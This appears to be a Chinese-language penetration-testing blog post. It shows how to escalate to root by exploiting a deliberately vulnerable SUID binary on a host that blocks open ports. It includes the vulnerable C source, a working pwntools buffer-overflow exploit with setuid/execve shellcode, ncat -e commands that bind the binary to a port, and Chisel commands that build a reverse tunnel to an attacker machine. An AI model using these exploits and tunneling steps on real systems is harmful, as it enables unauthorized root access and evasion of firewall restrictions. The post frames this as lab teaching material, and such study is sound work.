---
title: "Remote binary tunneling & Buffer overflow using pwntools"
date: 2022-05-24T00:24:42+08:00
draft: false
url: "/2022/05/24/remote-binary-tunneling-buffer-overflow-using-pwntools/"
categories:
  - 滲透測試
  - Linux
showToc: true
TocOpen: false
---

前陣子因緣際會下，遇到了某個情境，是在一個斷網的環境底下需要透過打 Pwn 的方式來進行提權。 這個環境的情境大概是，一個 Binary 具有 SUID 權限可以 Pwn。

但另外一個條件是，機器上面不能開 Port 出來，我也不可能幫對方的機器裝 Pwntools，身為一個 Pwntools 的愛用者，我決定使用邪門歪道把程式給跑起來，接下來進行 Pwn 的動作。

這邊的範例，我使用到今年初，我在[台科大資工系講課時的教材](https://github.com/stevenyu113228/NTUST-OS-Course-Buffer-Overflow)，使用 Ubuntu 18.04 的環境打 64 bit 的 Return to Shellcode 的情境。 但這篇文的主旨不在 Exploit 這隻 Binary 的過程，而是如何透過 Tunneling 的方式把 Binary 帶到外面來打。因此我直接附上 Binary Source Code 以及 Exploit Code。

```c
// gcc -no-pie -fno-stack-protector -z execstack ret2sc2.c -o ret2sc2
#include 
#include 

char name[100];

int main(){
    printf("What's your name : ");
    scanf("%s",name);

    char comment[500];
    printf("What's your comment : ");
    scanf("%s",comment);
    return 0;
}
```

這邊我關閉了 PIE、Canary 以及 NX 保護，作為最簡單的 Demo 使用， Exploit Code 則使用 pwntools 來寫，非常簡單，就只是蓋 Return Address 並塞下 Shell Code 而已，而我的 Shell Code 是抄[網路上](https://www.exploit-db.com/exploits/13320)的，就只是一個 `setuid(0)` 以及 `execve(/bin/sh)`。

```python
from pwn import *

# Shellcode from : https://www.exploit-db.com/exploits/13320
Shellcode = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"

p = process("./demo")
p.sendline(Shellcode)
p.sendline(b'a'*520+p64(0x601060))
p.interactive()
```

在本地測試完畢後，我們要如何在 Remote 把這隻 Binary 給掛到 Remote 上呢？ 最簡單的方法就是用 ncat。 蛤？ 那要怎麼在遠端電腦上裝 ncat 呢？ 我自己使用最簡單的方法就是去網路上抓 [ncat 的 Static Binary ](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat)，先丟進 Victim 中。

所以我的 Victim 端，環境大概會長這樣。

![](https://i.imgur.com/tCn4K3h.png)

## Bind Binary

接下來要做的事情，就是把 `./demo` 這隻檔案給執行並透過 Port 帶出來，如果防火牆沒有限制的話，我們可以用簡單的方法把 Binary 給 Bind 在我們的機器上，舉例來說。

```bash
./ncat -nlvp 9999 -e ./demo
```

接下來我們把上面的 Python Exploit Code，第 6 行給改成

```python
p = remote("192.168.86.139",9999)
```

Bang! 我們就拿到 root shell 了  
![](https://i.imgur.com/5ttyUmp.png)

## Reverse Binary

但我們要設想到另外一個情境是，Victim 上面的防火牆機器不給開 Port，我們顯然就沒有辦法透過 Bind 的方法把內容給帶出來，這個時候就要用 Reverse Tunnel 的方法來做。

這邊我使用我最愛用的 Tunnel 工具， Chisel 來做示範，一樣先把 Chisel 給丟進去 Victim 機器中。

在 Attacker 機器上輸入以下指令，開啟 Chisel Listener Server 在 443 Port

```bash
./chisel64 server -p 443 --reverse
```

接下來在 Victim 端輸入以下指令，把 Victim 本地的 9999 Port 給 Forward 到 Attacker (192.168.86.140) 的 9487 Port 上面，其中通訊走的是 192.168.86.140:443 這條通道。

```bash
./chisel client 192.168.86.140:443 R:9487:127.0.0.1:9999
```

再來，跟剛剛一樣在本地做 Bind Binary 的動作

```bash
./ncat -nlvp 9999 -e ./demo
```

回到 Attacker 端，此時 Attacker 端的 127.0.0.1:9487 即會自動轉到 Victim 的 9999 Port 上面，所以我們再把上面 Python 的 Exploit Code 第六行修改為以下。

```python
p = remote("127.0.0.1",9487)
```

我們就能輕鬆的把 Binary 給 Pwn 下來，拿到 root 的權限。

![](https://i.imgur.com/jTgx6OQ.png)
